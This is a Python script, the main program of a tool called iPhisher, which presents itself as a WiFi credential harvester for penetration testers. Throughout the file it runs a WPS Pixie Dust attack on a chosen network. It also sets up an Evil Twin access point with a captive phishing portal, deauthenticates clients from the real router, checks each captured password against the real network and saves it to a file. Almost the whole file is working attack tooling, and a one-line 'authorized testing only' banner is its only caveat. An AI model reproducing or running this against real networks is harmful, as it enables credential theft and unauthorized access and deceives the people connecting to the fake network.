#!/usr/bin/env python3
"""iPhisher - Advanced WiFi Credential Harvester for Penetration Testers"""

import os
import sys
import time
import signal
import threading
from typing import Optional

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.live import Live
from rich.text import Text
from rich import box

from core.scanner import scan_networks, AccessPoint
from core.deauth import DeauthAttack
from core.evil_twin import EvilTwin
from core.captive_portal import CaptivePortal
from core.wps_attack import WPSAttack
from core.verifier import verify_password
from utils.interface import (
    get_wifi_interfaces,
    set_monitor_mode,
    configure_ap_interface,
    setup_captive_redirect,
    flush_iptables,
)

console = Console()
VERSION = "1.0.0"

BANNER = r"""
[bold red]
  _ ____  _     _     _
 (_)  _ \| |__ (_)___| |__   ___ _ __
 | || |_) | '_ \| / __| '_ \ / _ \ '__|
 | ||  __/| | | | \__ \ | | |  __/ |
 |_||_|   |_| |_|_|___/_| |_|\___|_|
[/bold red]"""


def check_root() -> None:
    if os.geteuid() != 0:
        console.print("[bold red][!][/bold red] iPhisher must be run as root.")
        sys.exit(1)


def check_dependencies() -> None:
    required = ["airmon-ng", "aireplay-ng", "hostapd", "dnsmasq", "wash"]
    optional = ["reaver", "bully", "hcxdumptool", "hcxpcapngtool", "hashcat"]
    missing_req = []
    missing_opt = []
    for tool in required:
        if os.system(f"which {tool} > /dev/null 2>&1") != 0:
            missing_req.append(tool)
    for tool in optional:
        if os.system(f"which {tool} > /dev/null 2>&1") != 0:
            missing_opt.append(tool)
    if missing_req:
        console.print(f"[bold red][!] Missing required tools:[/bold red] {', '.join(missing_req)}")
        console.print("[dim]Run ./install.sh to install dependencies.[/dim]")
        sys.exit(1)
    if missing_opt:
        console.print(f"[yellow][*] Optional tools not found:[/yellow] {', '.join(missing_opt)}")
        console.print("[dim]Some attack modes may be unavailable.[/dim]\n")


def select_interfaces() -> dict:
    """Let user assign roles to WiFi adapters."""
    ifaces = get_wifi_interfaces()
    if len(ifaces) < 2:
        console.print("[bold red][!][/bold red] At least 2 WiFi adapters are required.")
        sys.exit(1)

    table = Table(title="Available WiFi Adapters", box=box.ROUNDED, border_style="blue")
    table.add_column("#", style="bold cyan", width=4)
    table.add_column("Interface", style="bold white")
    table.add_column("Modes", style="green")
    for i, iface in enumerate(ifaces, 1):
        modes = []
        if iface.get("monitor"):
            modes.append("monitor")
        if iface.get("ap"):
            modes.append("AP")
        modes.append("managed")
        table.add_row(str(i), iface["name"], ", ".join(modes))
    console.print(table)

    n = len(ifaces)
    deauth_idx = IntPrompt.ask(f"[cyan]>[/cyan] Adapter for [bold]DEAUTH[/bold] (monitor mode)", choices=[str(i) for i in range(1, n + 1)])
    ap_idx     = IntPrompt.ask(f"[cyan]>[/cyan] Adapter for [bold]EVIL TWIN[/bold] (AP mode)", choices=[str(i) for i in range(1, n + 1)])
    verify_idx = IntPrompt.ask(f"[cyan]>[/cyan] Adapter for [bold]VERIFICATION[/bold] (managed mode)", choices=[str(i) for i in range(1, n + 1)])

    return {
        "deauth":  ifaces[int(deauth_idx) - 1]["name"],
        "ap":      ifaces[int(ap_idx) - 1]["name"],
        "verify":  ifaces[int(verify_idx) - 1]["name"],
    }


def select_target(mon_iface: str) -> AccessPoint:
    """Scan and let user pick a target network."""
    console.print(f"\n[cyan][*][/cyan] Scanning for networks on [bold]{mon_iface}[/bold]...")
    networks = scan_networks(mon_iface, duration=12)

    if not networks:
        console.print("[bold red][!][/bold red] No networks found. Check your adapter.")
        sys.exit(1)

    networks.sort(key=lambda x: x.signal, reverse=True)
    table = Table(title="Discovered Networks", box=box.ROUNDED, border_style="cyan")
    table.add_column("#",       style="bold cyan",  width=4)
    table.add_column("SSID",    style="bold white",  min_width=20)
    table.add_column("BSSID",   style="dim white",   width=18)
    table.add_column("CH",      style="yellow",      width=4)
    table.add_column("Signal",  style="green",       width=8)
    table.add_column("Enc",     style="magenta",     width=6)
    table.add_column("WPS",     style="red",         width=5)

    for i, ap in enumerate(networks, 1):
        sig_str = f"{ap.signal} dBm"
        wps_str = "YES" if ap.wps else "-"
        table.add_row(str(i), ap.ssid, ap.bssid, str(ap.channel), sig_str, ap.encryption, wps_str)
    console.print(table)

    idx = IntPrompt.ask("[cyan]>[/cyan] Select target", choices=[str(i) for i in range(1, len(networks) + 1)])
    return networks[int(idx) - 1]


def run_wps_attack(target: AccessPoint, mon_iface: str) -> Optional[str]:
    """Run WPS Pixie Dust attack. Returns password or None."""
    console.print(f"\n[green][+][/green] WPS detected on [bold]{target.ssid}[/bold]! Launching Pixie Dust attack...")
    result: list[Optional[str]] = [None]
    done = threading.Event()

    def on_success(pwd: str):
        result[0] = pwd
        done.set()

    attack = WPSAttack(mon_iface, target.bssid, on_success=on_success)
    attack.start()

    with console.status("[bold green]Running WPS Pixie Dust...[/bold green]") as status:
        for i in range(120):
            if done.is_set():
                break
            time.sleep(1)
            if i % 10 == 0:
                status.update(f"[bold green]WPS attack running... ({i}s)[/bold green]")
    attack.stop()
    return result[0]


def run_evil_twin_attack(target: AccessPoint, ifaces: dict) -> Optional[str]:
    """Run Evil Twin + Captive Portal attack. Returns captured password or None."""
    ap_iface     = ifaces["ap"]
    deauth_iface = ifaces["deauth"]
    verify_iface = ifaces["verify"]
    portal_ip    = "10.0.0.1"

    console.print(f"\n[cyan][*][/cyan] Setting up Evil Twin for [bold]{target.ssid}[/bold]...")

    # Configure AP interface
    if not configure_ap_interface(ap_iface, portal_ip):
        console.print(f"[red][!][/red] Failed to configure {ap_iface}")
        return None

    # Start evil twin
    et = EvilTwin(ap_iface, target.ssid, target.channel)
    if not et.start():
        console.print("[red][!][/red] Failed to start Evil Twin (check hostapd)")
        return None
    console.print(f"[green][+][/green] Evil Twin active: SSID=[bold]{target.ssid}[/bold] on {ap_iface}")

    # Set up captive portal redirect
    setup_captive_redirect(ap_iface, portal_port=80)

    # Credential capture state
    captured: list[Optional[str]] = [None]
    verified: list[Optional[bool]] = [None]
    done = threading.Event()

    def on_credential(password: str):
        captured[0] = password
        console.print(f"\n[bold green][+] Credential captured![/bold green] Testing against real AP...")
        ok = verify_password(verify_iface, target.ssid, target.bssid, password)
        verified[0] = ok
        done.set()

    portal = CaptivePortal(host=portal_ip, port=80, on_credential=on_credential)
    portal.start()
    console.print(f"[green][+][/green] Captive portal listening on http://{portal_ip}")

    # Start deauth
    deauth = DeauthAttack(deauth_iface, target.bssid)
    deauth.start()
    console.print(f"[green][+][/green] Deauth attack started → [bold]{target.bssid}[/bold]\n")

    # Live status loop
    start_time = time.time()
    try:
        while not done.is_set():
            elapsed = int(time.time() - start_time)
            console.print(
                f"\r[dim]  Waiting for victim... {elapsed}s | SSID: {target.ssid}[/dim]",
                end="",
            )
            time.sleep(2)
            if elapsed > 600:
                console.print("\n[yellow][!] Timeout (10 min). No credentials captured.[/yellow]")
                break
    except KeyboardInterrupt:
        console.print("\n[yellow][!] Interrupted by user.[/yellow]")

    # Cleanup
    deauth.stop()
    et.stop()
    flush_iptables()

    return captured[0]


def display_result(target: AccessPoint, password: Optional[str], verified: Optional[bool]) -> None:
    if not password:
        console.print(Panel("[yellow]No credentials captured.[/yellow]", title="Result", border_style="yellow"))
        return

    status = "[bold green]✓ VERIFIED[/bold green]" if verified else "[yellow]⚠ UNVERIFIED[/yellow]"
    content = (
        f"  SSID     : [bold white]{target.ssid}[/bold white]\n"
        f"  BSSID    : [dim]{target.bssid}[/dim]\n"
        f"  Password : [bold green]{password}[/bold green]\n"
        f"  Status   : {status}"
    )
    console.print(Panel(content, title="[bold green]Credentials Captured[/bold green]", border_style="green"))

    # Save to file
    log_path = "/tmp/iphisher_results.txt"
    with open(log_path, "a") as f:
        f.write(f"SSID={target.ssid} BSSID={target.bssid} PASSWORD={password} VERIFIED={verified}\n")
    console.print(f"[dim]Saved to {log_path}[/dim]")


def main() -> None:
    check_root()

    console.print(BANNER)
    console.print(f"[dim]  Version {VERSION} | For authorized penetration testing only[/dim]\n")

    check_dependencies()

    # Adapter selection
    ifaces = select_interfaces()
    console.print(f"\n[cyan][*][/cyan] Enabling monitor mode on [bold]{ifaces['deauth']}[/bold]...")
    mon_iface = set_monitor_mode(ifaces["deauth"])
    if not mon_iface:
        console.print(f"[red][!][/red] Could not enable monitor mode on {ifaces['deauth']}")
        sys.exit(1)
    ifaces["deauth"] = mon_iface
    console.print(f"[green][+][/green] Monitor interface: [bold]{mon_iface}[/bold]")

    # Target selection
    target = select_target(mon_iface)
    console.print(f"\n[green][+][/green] Target: [bold]{target.ssid}[/bold] ({target.bssid}) CH:{target.channel}")

    password: Optional[str] = None
    verified: Optional[bool] = None

    # Attack path decision
    if target.wps and Confirm.ask("\n[cyan]>[/cyan] WPS detected — run Pixie Dust attack first?", default=True):
        password = run_wps_attack(target, mon_iface)
        if password:
            verified = True
        else:
            console.print("[yellow][!] WPS attack failed. Falling back to Evil Twin...[/yellow]")

    if not password:
        password = run_evil_twin_attack(target, ifaces)
        if password:
            verified_list: list[Optional[bool]] = [None]
            # The verifier was called inside the callback; read result
            # Re-verify here to capture the result cleanly
            console.print("[cyan][*][/cyan] Verifying captured password...")
            verified = verify_password(ifaces["verify"], target.ssid, target.bssid, password)

    display_result(target, password, verified)


def _cleanup_handler(sig, frame):
    console.print("\n[yellow][!] Cleaning up...[/yellow]")
    flush_iptables()
    sys.exit(0)


signal.signal(signal.SIGINT, _cleanup_handler)
signal.signal(signal.SIGTERM, _cleanup_handler)

if __name__ == "__main__":
    main()
